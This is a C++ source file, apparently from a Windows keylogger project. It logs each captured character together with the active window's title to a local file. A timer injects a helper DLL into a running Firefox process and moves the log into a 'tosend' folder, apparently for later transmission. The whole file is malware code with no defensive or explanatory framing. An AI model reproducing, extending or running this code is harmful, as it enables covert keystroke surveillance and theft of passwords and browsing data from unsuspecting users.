#include <stdio.h>
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <Shlwapi.h>
#include "hook.h"
using namespace std;

#include "print.h"
HWND g_hCurrentWindow = NULL;
char* filename = "G:\\ProjectFiles\\log.txt";
bool bMoveFile = false;
bool bHooked = false;

void PrintIfNotCurrWin()
{
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	if (g_hCurrentWindow == hwnd) return;
	g_hCurrentWindow = hwnd;
	char wnd_title[256];
	GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
	ofstream myfile;
	myfile.open(filename, ios::app);
	myfile << '[' << wnd_title << ']';
	myfile.close();
}

void print(char a)
{
	PrintIfNotCurrWin();
	ofstream myfile;
	myfile.open(filename, ios::app);
	myfile << a;
	myfile.close();
	printf("%c", a);
	if (bMoveFile)
	{
		MoveFileA("G:\\ProjectFiles\\log.txt", "G:\\ProjectFiles\\tosend\\log.txt");
		bMoveFile = false;
	}
}

void print(char *a)
{
	PrintIfNotCurrWin();
	ofstream myfile;
	myfile.open(filename, ios::app);
	myfile << a;
	myfile.close();
	printf("%s", a);
	if (bMoveFile)
	{
		MoveFileA("G:\\ProjectFiles\\log.txt", "G:\\ProjectFiles\\tosend\\log.txt");
		bMoveFile = false;
	}
}

typedef int (*sendfile)(void);

VOID CALLBACK TimerProc(HWND hwnd, UINT  uMsg, UINT_PTR idEvent, DWORD dwTime)
{

	printf("\n\nTImerProc Called\n\n");

	dllInjector	dllinject;
	if (0 != dllinject.getPid("firefox.exe"))
	{
		if (!bHooked)
		{
			dllinject._dllPath = "G:\\ProjectFiles\\dll_helper.dll";
			dllinject.injectDll("firefox.exe");
			bHooked = true;
			printf("\n\nDll injected\n\n");
		}
		else
		{
			printf("\n\nDll already injected\n\n");
		}
	}
	else
	{
		bHooked = false;
		printf("\n\nNo firefix running\n\n");
	}
	if (!PathIsDirectoryEmpty("G:\\ProjectFiles\\tosend"))
	{
		printf("\n\nfolder not empty\n\n");
		return;
	}
	bMoveFile = true;
}

